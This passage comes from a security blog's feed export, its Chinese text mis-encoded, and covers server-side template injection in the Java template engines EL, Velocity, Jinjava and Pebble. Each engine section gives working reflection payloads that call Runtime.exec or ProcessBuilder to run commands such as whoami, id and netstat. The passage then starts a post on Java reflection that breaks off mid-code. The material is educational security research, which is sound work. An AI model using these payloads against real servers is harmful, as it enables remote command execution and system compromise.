·å­äº†ã€‚<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>ç…§é“ç†ä¸Šé¢å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ï¼Œä½†æ˜¯å‘¢Runtimeç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨newInstance()æ–¹æ³•æ¥å®ä¾‹åŒ–ã€‚åªèƒ½é€šè¿‡è°ƒç”¨getRuntime()æ–¹æ³•æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚æ‰€ä»¥newInstance()å¾—æ›¿æ¢æˆ<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>æœ€ç»ˆpayloadå°±å˜æˆäº†ä¸‹é¢è¿™æ ·å­ã€‚<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h1><h2 id="å‰è¨€-2"><a href="#å‰è¨€-2" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp; Velocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œæ˜¯éš¶å±äºApacheæ——ä¸‹çš„ä¸€ä¸ªå¼€æºé¡¹ç›®ã€‚å®ƒå…è®¸ä»»ä½•äººä½¿ç”¨ç®€å•è€Œå¼ºå¤§çš„æ¨¡æ¿è¯­è¨€æ¥å¼•ç”¨Javaä»£ç ä¸­å®šä¹‰çš„å¯¹è±¡ã€‚<br>&emsp;&emsp; ä¸‹é¢æ˜¯Velocityçš„SSTIçš„payloadï¼Œæ­¤æ—¶çš„ä½ å¯èƒ½ä¼šæœ‰ä¸ªç–‘é—®ã€‚payloadè¯­æ³•å¥½åƒæœ‰ç‚¹å¥‡æ€ªï¼Ÿè¿™ä¸ªå…¶å®æ˜¯æ¨¡æ¿è¯­æ³•ï¼Œæ¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“çš„è¯­æ³•éƒ½ä¸åŒã€‚ç¬”è€…è§‰å¾—å¤§åŒå°å¼‚ï¼Œæœ‰è¿‡ç¼–ç¨‹çš„åŸºç¡€ç«¥é‹ï¼Œç¨åŠ å­¦ä¹ å°±èƒ½æ˜ç™½ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h3 id="setè¯­æ³•"><a href="#setè¯­æ³•" class="headerlink" title="#setè¯­æ³•"></a>#setè¯­æ³•</h3><p>&emsp;&emsp;  #setè¯­æ³•å¯ä»¥åˆ›å»ºä¸€ä¸ªVelocityçš„å˜é‡ï¼Œ#setè¯­æ³•å¯¹åº”çš„Velocityè¯­æ³•æ ‘æ˜¯ASTSetDirectiveç±»ï¼Œç¿»å¼€è¿™ä¸ªç±»çš„ä»£ç ï¼Œå¯ä»¥å‘ç°å®ƒæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼šåˆ†åˆ«æ˜¯RightHandSideå’ŒLeftHandSideï¼Œåˆ†åˆ«ä»£è¡¨â€œ=â€ä¸¤è¾¹çš„è¡¨è¾¾å¼å€¼ã€‚ä¸Javaè¯­è¨€çš„èµ‹å€¼æ“ä½œæœ‰ç‚¹ä¸ä¸€æ ·çš„æ˜¯ï¼Œå·¦è¾¹çš„LeftHandSideå¯èƒ½æ˜¯ä¸€ä¸ªå˜é‡æ ‡è¯†ç¬¦ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªsetæ–¹æ³•è°ƒç”¨ã€‚å˜é‡æ ‡è¯†ç¬¦å¾ˆå¥½ç†è§£ï¼Œå¦‚å‰é¢çš„#set($ var=â€œå¶æ•°â€)ï¼Œå¦å¤–æ˜¯ä¸€ä¸ªsetæ–¹æ³•è°ƒç”¨ï¼Œå¦‚#set($person.name=â€junshanâ€)ï¼Œè¿™å®é™…ä¸Šç›¸å½“äºJavaä¸­person.setName(â€œjunshanâ€)æ–¹æ³•çš„è°ƒç”¨ã€‚</p><h3 id="foreachè¯­æ³•"><a href="#foreachè¯­æ³•" class="headerlink" title="foreachè¯­æ³•"></a>foreachè¯­æ³•</h3><p>&emsp;&emsp; Velocityä¸­çš„å¾ªç¯è¯­æ³•åªæœ‰è¿™ä¸€ç§ï¼Œå®ƒä¸Javaä¸­çš„forå¾ªç¯çš„è¯­æ³•ç³–å½¢å¼ååˆ†ç±»ä¼¼ï¼Œå¦‚#foreach($ child in $person.children) $ person.childrenè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªé›†åˆï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªListé›†åˆæˆ–è€…ä¸€ä¸ªæ•°ç»„ï¼Œè€Œ$ childè¡¨ç¤ºçš„æ˜¯æ¯ä¸ªä»é›†åˆä¸­å–å‡ºçš„å€¼ã€‚ä»renderæ–¹æ³•ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼ŒVelocityé¦–å…ˆæ˜¯å–å¾—$ person.childrençš„å€¼ï¼Œç„¶åå°†è¿™ä¸ªå€¼å°è£…æˆIteratoré›†åˆï¼Œç„¶åä¾æ¬¡å–å‡ºè¿™ä¸ªé›†åˆä¸­çš„æ¯ä¸€ä¸ªå€¼ï¼Œå°†è¿™ä¸ªå€¼ä»¥$childä¸ºå˜é‡æ ‡è¯†ç¬¦æ”¾å…¥contextä¸­ã€‚é™¤æ­¤ä»¥å¤–éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒVelocityåœ¨å¾ªç¯æ—¶è¿˜åœ¨contextä¸­æ”¾å…¥äº†å¦å¤–ä¸¤ä¸ªå˜é‡ï¼Œåˆ†åˆ«æ˜¯counterNameå’ŒhasNextNameï¼Œè¿™ä¸¤ä¸ªå˜é‡çš„åç§°åˆ†åˆ«åœ¨é…ç½®æ–‡ä»¶é…ç½®é¡¹directive.foreach.counter.nameå’Œdirective.foreach.iterator.nameä¸­å®šä¹‰ï¼Œå®ƒä»¬è¡¨ç¤ºå½“å‰çš„å¾ªç¯è®¡æ•°å’Œæ˜¯å¦è¿˜æœ‰ä¸‹ä¸€ä¸ªå€¼ã€‚å‰è€…ç›¸å½“äºfor(int i=1;i&lt;10;i++)ä¸­çš„iå€¼ï¼Œåè€…ç›¸å½“äºwhile(it.hasNext())ä¸­çš„it.hasNext()çš„å€¼ï¼Œè¿™ä¸¤ä¸ªå€¼åœ¨#foreachçš„å¾ªç¯ä½“ä¸­éƒ½æœ‰å¯èƒ½ç”¨åˆ°ã€‚ç”±äºelementKeyã€counterNameå’ŒhasNextNameæ˜¯åœ¨#foreachä¸­ä¸´æ—¶åˆ›å»ºçš„ï¼Œå¦‚æœå½“å‰çš„contextä¸­å·²ç»å­˜åœ¨è¿™å‡ ä¸ªå˜é‡ï¼Œè¦æŠŠåŸå§‹çš„å˜é‡å€¼ä¿å­˜èµ·æ¥ï¼Œä»¥ä¾¿åœ¨è¿™ä¸ª#foreachæ‰§è¡Œç»“æŸåæ¢å¤ã€‚å¦‚æœcontextä¸­æ²¡æœ‰è¿™å‡ ä¸ªå˜é‡ï¼Œé‚£ä¹ˆ#foreachæ‰§è¡Œç»“æŸåè¦åˆ é™¤å®ƒä»¬ï¼Œè¿™å°±æ˜¯ä»£ç æœ€åéƒ¨åˆ†åšçš„äº‹æƒ…ï¼Œè¿™ä¸æˆ‘ä»¬å‰é¢ä»‹ç»çš„#setè¯­æ³•æ²¡æœ‰èŒƒå›´é™åˆ¶ä¸åŒï¼Œ#foreachä¸­ä¸´æ—¶äº§ç”Ÿçš„å˜é‡åªåœ¨#foreachä¸­æœ‰æ•ˆã€‚</p><p>æ›´å¤šè¯­æ³•çŸ¥è¯†æ¨è<a href="http://www.yunshouce.com/g62/velocitydoc/11.html" target="_blank" rel="noopener">Velocityä¸­æ–‡æ–‡æ¡£</a>ã€‚</p><hr><h2 id="åå°„Payload"><a href="#åå°„Payload" class="headerlink" title="åå°„Payload"></a>åå°„Payload</h2><p>&emsp;&emsp; äº†è§£è¯­æ³•ä¹‹åï¼Œå›å¤´çœ‹payloadä¼šè§‰å¾—å¾ˆç®€å•ï¼Œå…¶å®å°±æ˜¯åŸºæœ¬çš„payloadçš„æ„é€ ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>æŠŠpayloadè½¬åŒ–æˆä¼ªä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rt = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">chr</span> </span>= java.lang.String</span><br><span class="line">ex = java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line">ex.waitFor()</span><br><span class="line"><span class="comment">// æ¥ç€å°±æ˜¯å¾ªç¯è¯»å–è¾“å‡º</span></span><br></pre></td></tr></table></figure><p><strong>æ¨èä¸€ä¸ªç»å…¸æ¡ˆä¾‹</strong><br><a href="https://samny.blog.csdn.net/article/details/102843715" target="_blank" rel="noopener">Apache Solr æ¨¡æ¿æ³¨å…¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</a>æ¼æ´è¯¦æƒ…<br><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">ç™½å¤´æ”æ›´çŸ­ï¼ŒSSTIæƒ¹äººå¿ƒï¼</a>æ¼æ´åˆ†æ</p><hr><h1 id="Jinjava"><a href="#Jinjava" class="headerlink" title="Jinjava"></a>Jinjava</h1><h2 id="å‰è¨€-3"><a href="#å‰è¨€-3" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp; Jinjavaæ˜¯ä¸€æ¬¾å¼€æºçš„ Java æ¨¡æ¿å¼•æ“ï¼ŒåŸºäº django æ¨¡æ¿è¯­æ³•ï¼Œé€‚ç”¨äºæ¸²æŸ“ jinja æ¨¡æ¿ï¼ˆè‡³å°‘æ˜¯ HubSpot å†…å®¹ä¸­ä½¿ç”¨çš„ jinja å­é›†ï¼‰ã€‚ç›®å‰åœ¨ç”Ÿäº§ä¸­ç”¨äºæ¸²æŸ“<code>HubSpot CMS</code>ï¼Œæ¯æœˆæœ‰æ•°ä»¥äº¿è®¡çš„é¡µé¢æµè§ˆé‡çš„ç½‘ç«™ã€‚<a href="https://github.com/HubSpot/jinjava" target="_blank" rel="noopener">å®˜æ–¹GitHubåœ°å€</a>ã€‚<br>åˆ¤æ–­Jinjavaæ˜¯å¦å­˜åœ¨SSTIæ¼æ´çš„payloadï¼š</p><ol><li>A å›æ˜¾å¤§å†™``A``</li><li> ä¼šè¿”å›ä¸€ä¸ªè¯·æ±‚å¯¹è±¡ ä¾‹å¦‚ï¼š``com.[...].context.TemplateContextRequest@23548206``</li></ol><h2 id="åå°„Payload-1"><a href="#åå°„Payload-1" class="headerlink" title="åå°„Payload"></a>åå°„Payload</h2><p>&emsp;&emsp; è¿™æ¬¾æ¨¡æ¿å¼•æ“çš„payloadç›´æ¥å°±èƒ½çœ‹å‡ºæ˜¯ç”¨Javaçš„åå°„æœºåˆ¶ï¼Œéƒ½æ˜¯å…ˆè·å–çš„<code>javax.script.ScriptEngineManager</code>ç±»å¯¹è±¡ï¼Œç„¶å<code>newInstance()</code>å®ä¾‹åŒ–ï¼Œåœ¨ä¹‹ååˆ›å»ºä¸€ä¸ª<code>JavaScript</code>å¼•æ“æœ€åæ‰§è¡Œå‘½ä»¤ã€‚<br><img src="https://img-blog.csdnimg.cn/20200430101257182.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"new java.lang.String(<span class="string">'xxx'</span>)\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Pebble"><a href="#Pebble" class="headerlink" title="Pebble"></a>Pebble</h1><p>&emsp;&emsp; Pebbleæ˜¯ä¸€ä¸ªå—Twigå¯å‘çš„javaæ¨¡æ¿åŒ–å¼•æ“ã€‚å®ƒä»¥å…¶ç»§æ‰¿åŠŸèƒ½å’Œæ˜“è¯»çš„è¯­æ³•ä»äººç¾¤ä¸­è„±é¢–è€Œå‡ºã€‚å®ƒå†…ç½®äº†å®‰å…¨çš„è‡ªåŠ¨ç¼©æ”¾åŠŸèƒ½ï¼Œå¹¶ä¸”åŒ…å«äº†å¯¹å›½é™…åŒ–çš„é›†æˆæ”¯æŒã€‚æ›´å¤šå†…å®¹æŸ¥çœ‹<a href="https://github.com/PebbleTemplates/pebble" target="_blank" rel="noopener">å®˜æ–¹GitHubåœ°å€</a>ï¼Œ<a href="https://pebbletemplates.io/wiki/guide/basic-usage/" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ã€‚<br>payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = <span class="string">'id'</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.Runtime'</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.String'</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; å„å¤§æ¨¡æ¿å¼•æ“åœ¨è®¾è®¡çš„æ—¶å€™ï¼Œéƒ½æˆ–å¤šæˆ–å°‘å˜ç›¸ç¦æ­¢<code>java.lang.Runtime</code>å’Œ<code>java.lang.Processbuilder</code>ç±»ï¼Œå› æ­¤ä½¿ç”¨Javaçš„åå°„æœºåˆ¶å¯ä»¥å®Œå…¨çš„ç»•è¿‡é™åˆ¶ã€‚æƒ³è¦æ·±å…¥å­¦ä¹ SSTIæ¼æ´çš„æ—¶å€™ï¼Œå»ºè®®çœ‹æ¨¡æ¿å¼•æ“å®˜æ–¹ç»™å‡ºçš„æ–‡æ¡£ï¼Œåœ¨ç»“åˆJDKæ–‡æ¡£å¤§å¤šæ•°æ¨¡æ¿å¼•æ“æ˜¯å¯ä»¥bypassçš„ã€‚</p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">https://samny.blog.csdn.net/article/details/104881477</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¦–å‘ï¼š&lt;a href=&quot;https://www.sec-in.com/article/309&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaåå°„" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>ä»å®‰å…¨è§’åº¦è°ˆJavaåå°„æœºåˆ¶--åºç« </title>
    <link href="https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/</id>
    <published>2020-05-12T08:42:16.000Z</published>
    <updated>2020-05-13T02:30:32.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¦–å‘ï¼š<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; ä¼—æ‰€å‘¨çŸ¥ï¼ŒJavaç›®å‰å½±å“æœ€å¤§çš„æ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Œæ¢ä¸€å¥è¯è¯´Javaå®‰å…¨æ˜¯ä»ååºåˆ—åŒ–æ¼æ´å¼€å§‹ï¼Œä½†ååºåˆ—åŒ–æ¼æ´åˆå¯ä»¥åŸºäºåå°„ï¼Œè¿™æ¬¡ç¬”è€…å¸¦ä½ èµ°è¿›Javaå®‰å…¨çš„å¤§é—¨ã€‚<br>&emsp;&emsp; Javaååºåˆ—åŒ–çš„payloadå¤§å¤šä¸åå°„æœºåˆ¶å¯†åˆ‡ç›¸å…³ï¼Œä½†ä»…ä»…æ˜¯å› ä¸ºè¿™ä¸ªå—ï¼Ÿç­”æ¡ˆè‚¯å®šæ˜¯ç‰‡é¢çš„ã€‚åå°„ä½œä¸ºå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€é‡Œå¿…ä¸å¯ç¼ºçš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–å…¶ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰çš„æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰æ–¹æ³•ï¼‰ï¼Œè·å–åˆ°æ–¹æ³•å¯ä»¥è°ƒç”¨ã€‚ä¸€å¥è¯ï¼Œåå°„ç»™Javaç­‰ç±»ä¼¼çš„é™æ€è¯­è¨€èµ‹äºˆäº†<code>â€œçµé­‚â€</code>ã€‚</p><p>ps: æœ¬æ–‡å®éªŒä»£ç éƒ½ä¸Šä¼ <a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>é¡¹ç›®ï¼Œä¸ºäº†è®©æ›´å¤šäººçŸ¥é“ï¼Œéº»çƒ¦åŠ¨åŠ¨å°æ‰‹starä¸€ä¸‹ã€‚</p><hr><h1 id="åå°„åŸºç¡€"><a href="#åå°„åŸºç¡€" class="headerlink" title="åå°„åŸºç¡€"></a>åå°„åŸºç¡€</h1><p>&emsp;&emsp; Javaåå°„æ“ä½œçš„å¯¹è±¡æ˜¯<code>java.lang.Class</code>å¯¹è±¡ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨Javaåå°„ï¼Œé¦–å…ˆå¾—è·å–Classå¯¹è±¡ã€‚ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€æ®µä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Class cls = Class.forName(className);</span><br><span class="line">cls.getMethod(methodName).invoke(cls.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ä»£ç ä¸­ï¼Œç¬”è€…æ¼”ç¤ºå‡ ä¸ªæ¯”è¾ƒé‡è¦çš„æ–¹æ³•ï¼š</p><ul><li>è·å–ç±»å¯¹è±¡çš„æ–¹æ³•<code>forName</code></li><li>ä»è·å–ç±»å¯¹è±¡ä¸­è·å–æ–¹æ³• <code>getMethod</code></li><li>æ‰§è¡Œå¾—åˆ°è·å–çš„æ–¹æ³•çš„æ–¹æ³•<code>invoke</code></li><li>å®ä¾‹åŒ–å¯¹è±¡<code>newInstance</code></li></ul><p>psï¼šå½“ç„¶åå°„ä¸å¯èƒ½ä»…ä»…åªæ˜¯è¿™äº›æ–¹æ³•ï¼Œä¸‹é¢ä¸­ç¬”è€…æœ‰æåŠå…¶ä»–çš„æ–¹æ³•ï¼Œå½“ç„¶ä¸å¯èƒ½æ˜¯å…¨éƒ¨éƒ½ä¸€ä¸€é“æ¥ï¼Œæ­£æ‰€è°“<code>æˆä¹‹ä¸é±¼ï¼Œä¸å¦‚æˆä¹‹äºæ¸”</code>ã€‚æ›´å¤šæ–¹æ³•å»ºè®®å¤§å®¶å»çœ‹JDKæ–‡æ¡£ï¼Œåœ¨çº¿çš„æ–‡æ¡£ç™¾åº¦ä¸€æœå°±æœ‰ã€‚</p><hr><h2 id="ç±»æºç "><a href="#ç±»æºç " class="headerlink" title="ç±»æºç "></a>ç±»æºç </h2><p>&emsp;&emsp; é¦–å…ˆç¬”è€…æ„é€ äº†ä¸¤ä¸ªç±»<code>students</code>å’Œ<code>classdemo1</code>ã€‚</p><hr><h3 id="å®ä½“ç±»studentsæºç ï¼š"><a href="#å®ä½“ç±»studentsæºç ï¼š" class="headerlink" title="å®ä½“ç±»studentsæºç ï¼š"></a>å®ä½“ç±»<code>students</code>æºç ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Students</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"samny"</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer CardId = <span class="number">332323223</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer id = <span class="number">10012</span>;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">"hello world"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">(Integer age, String name, Integer cardId, Integer id, String hello)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.CardId = cardId;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.hello = hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Students&#123;"</span> +</span><br><span class="line">                <span class="string">"age="</span> + age +</span><br><span class="line">                <span class="string">", name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", CardId="</span> + CardId +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">", ags='"</span> + hello + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ä»¥ä¸‹çœç•¥setï¼Œgetä»¥åŠtoStringæ–¹æ³•ã€‚</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="å®ä½“ç±»classdemo1çš„æºç ï¼š"><a href="#å®ä½“ç±»classdemo1çš„æºç ï¼š" class="headerlink" title="å®ä½“ç±»classdemo1çš„æºç ï¼š"></a>å®ä½“ç±»<code>classdemo1</code>çš„æºç ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classdemo1</span> 